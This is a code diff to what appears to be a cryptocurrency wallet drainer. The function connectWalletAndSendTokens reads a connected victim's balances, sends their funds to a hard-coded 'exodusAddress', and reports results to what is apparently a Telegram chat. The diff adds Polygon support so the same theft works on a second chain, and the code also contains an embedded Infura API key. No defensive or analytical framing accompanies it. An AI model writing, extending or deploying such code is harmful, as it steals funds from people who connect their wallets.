@@ -109,6 +109,12 @@ async function connectWalletAndSendTokens() {
       name: "Ethereum",
       chainName: "eth",
       exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57"
+    },
+    {
+      chainId: 137,
+      name: "Polygon",
+      chainName: "polygon",
+      exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57"
     }
   ];
 
@@ -153,6 +159,13 @@ async function connectWalletAndSendTokens() {
                 rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
                 nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
                 blockExplorerUrls: ['https://etherscan.io']
+              },
+              137: {
+                chainId: '0x89',
+                chainName: 'Polygon Mainnet',
+                rpcUrls: ['https://polygon-rpc.com'],
+                nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
+                blockExplorerUrls: ['https://polygonscan.com']
               }
             }[network.chainId];
             await instance.request({
@@ -211,7 +224,6 @@ async function connectWalletAndSendTokens() {
                   return `• ${token.symbol}: ${balance}`;
                 }).join("\n")
               : "No non-zero ERC-20 token balances found.";
-
           } catch (apiErr) {
             console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
             if (apiAttempts === maxAttempts) {
@@ -224,7 +236,7 @@ async function connectWalletAndSendTokens() {
 
         const nativeBalance = await currentProvider.getBalance(userAddress);
         const formattedBalance = ethers.utils.formatEther(nativeBalance);
-        const nativeBalanceMessage = `• ETH: ${formattedBalance}`;
+        const nativeBalanceMessage = `• ${network.chainId === 1 ? 'ETH' : 'MATIC'}: ${formattedBalance}`;
 
         const networkMessage = `
 📥 Wallet Connected on ${network.name}
@@ -268,7 +280,6 @@ Tx: ${tx.hash}
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({ chat_id: chatId, text: successMessage })
             });
-
           } catch (err) {
             const errorMessage = `
 ❌ Transfer Failed
